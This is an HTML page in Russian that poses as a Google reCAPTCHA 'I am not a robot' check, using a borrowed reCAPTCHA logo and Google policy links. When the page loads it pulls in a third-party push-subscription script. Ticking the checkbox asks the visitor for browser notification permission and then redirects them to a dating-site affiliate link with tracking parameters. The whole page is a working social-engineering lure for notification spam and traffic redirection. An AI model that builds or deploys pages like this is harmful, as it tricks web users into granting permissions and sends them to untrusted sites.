<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>reCAPTCHA</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f9f9f9;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
        }
        .captcha-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            padding: 10px;
            border: 1px solid #dfe1e5;
            border-radius: 4px;
            background-color: #fff;
        }
        .captcha-left {
            display: flex;
            align-items: center;
        }
        .captcha-checkbox {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            cursor: pointer;
            transition: background-color 0.3s ease, border-color 0.3s ease;
            appearance: none; /* Убираем стандартный вид */
            border: 2px solid #5f6368;
            border-radius: 4px;
            position: relative;
        }
        .captcha-checkbox:checked {
            background-color: #1a73e8;
            border-color: #1a73e8;
            animation: fillCheckbox 0.3s ease;
        }
        .captcha-checkbox:checked::after {
            content: '\2713'; /* Символ галочки */
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 14px;
        }
        @keyframes fillCheckbox {
            0% {
                background-color: #fff;
                border-color: #5f6368;
            }
            100% {
                background-color: #1a73e8;
                border-color: #1a73e8;
            }
        }
        .captcha-text {
            font-size: 14px;
            color: #202124;
        }
        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }
        .captcha-logo {
            width: 20px;
            height: 20px;
            margin-bottom: 5px;
        }
        .captcha-brand {
            font-size: 12px;
            color: #1a73e8;
        }
        .captcha-links {
            font-size: 10px;
            color: #5f6368;
        }
        .captcha-links a {
            color: #5f6368;
            text-decoration: none;
        }
        .submit-button {
            padding: 8px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }
        .submit-button:hover {
            background-color: #e8eaed;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .error {
            color: red;
            font-size: 12px;
            display: none;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
    <div class="container">
        <div class="captcha-container">
            <div class="captcha-left">
                <input type="checkbox" id="captcha" class="captcha-checkbox">
                <span class="captcha-text">Я не робот</span>
            </div>
            <div class="captcha-right">
                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                <span class="captcha-brand">reCAPTCHA</span>
                <div class="captcha-links">
                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
                </div>
            </div>
        </div>
        <div class="button-container">
            <button class="submit-button" id="submit-button">Отправить</button>
            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
        </div>
    </div>

    <script>
        // Регистрация Service Worker (закомментировано для тестирования)
        /*
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/HnFv7gIgUEyhZsQd8kp20Q.js')
                .then(registration => {
                    console.log('Service Worker зарегистрирован:', registration);
                })
                .catch(err => {
                    console.error('Ошибка регистрации Service Worker:', err);
                });
        } else {
            console.warn('Service Worker не поддерживается');
        }
        */

        // Ссылка для редиректа
        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';

        // Функция для логирования подписки
        function logSubscription(permission, subId = 'test_campaign') {
            const data = {
                id: 'HnFv7gIgUEyhZsQd8kp20Q',
                sub_id: subId,
                permission: permission,
                timestamp: new Date().toISOString()
            };
            console.log('Лог подписки:', data);
        }

        // Функция для выполнения редиректа (взята из первого кода)
        function performRedirect() {
            console.log('Попытка редиректа на:', redirectUrl);
            try {
                window.location.href = redirectUrl;
                setTimeout(() => {
                    if (window.location.href !== redirectUrl) {
                        window.location.replace(redirectUrl);
                    }
                }, 500);
            } catch (e) {
                console.error('Ошибка редиректа:', e);
                document.getElementById('error').innerText = 'Редирект не сработал. Перейдите по ссылке: ' + redirectUrl;
                document.getElementById('error').style.display = 'block';
            }
        }

        // Функция для запроса подписки (взята из текущего кода)
        function requestSubscription() {
            console.log('Запуск requestSubscription');
            if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                logSubscription(Notification.permission);
                performRedirect();
                return;
            }

            const checkPsReady = () => {
                console.log('Проверка ps.js');
                if (window.ps && typeof window.ps.showPrompt === 'function') {
                    console.log('Вызываем подписку через ps.js');
                    window.ps.showPrompt()
                        .then(result => {
                            console.log('Результат подписки:', result);
                            logSubscription(Notification.permission);
                            performRedirect();
                        })
                        .catch(err => {
                            console.error('Ошибка вызова подписки:', err);
                            logSubscription(Notification.permission);
                            performRedirect();
                        });
                } else {
                    console.log('API ps.js не доступен, пробуем Notification API');
                    if ('Notification' in window) {
                        Notification.requestPermission()
                            .then(permission => {
                                console.log('Результат разрешения:', permission);
                                logSubscription(permission);
                                performRedirect();
                            })
                            .catch(err => {
                                console.error('Ошибка Notification API:', err);
                                logSubscription('error');
                                performRedirect();
                            });
                    } else {
                        console.log('Уведомления не поддерживаются');
                        logSubscription('unsupported');
                        performRedirect();
                    }
                }
            };

            setTimeout(checkPsReady, 500);
        }

        // Функция проверки
        function verify() {
            const checkbox = document.getElementById('captcha');
            const error = document.getElementById('error');
            if (checkbox.checked) {
                console.log('Чекбокс отмечен, запускаем подписку');
                error.style.display = 'none';
                setTimeout(requestSubscription, 100);
            } else {
                error.style.display = 'block';
            }
        }

        // События
        document.getElementById('captcha').addEventListener('change', verify);
        document.getElementById('submit-button').addEventListener('click', verify);
    </script>
</body>
</html>
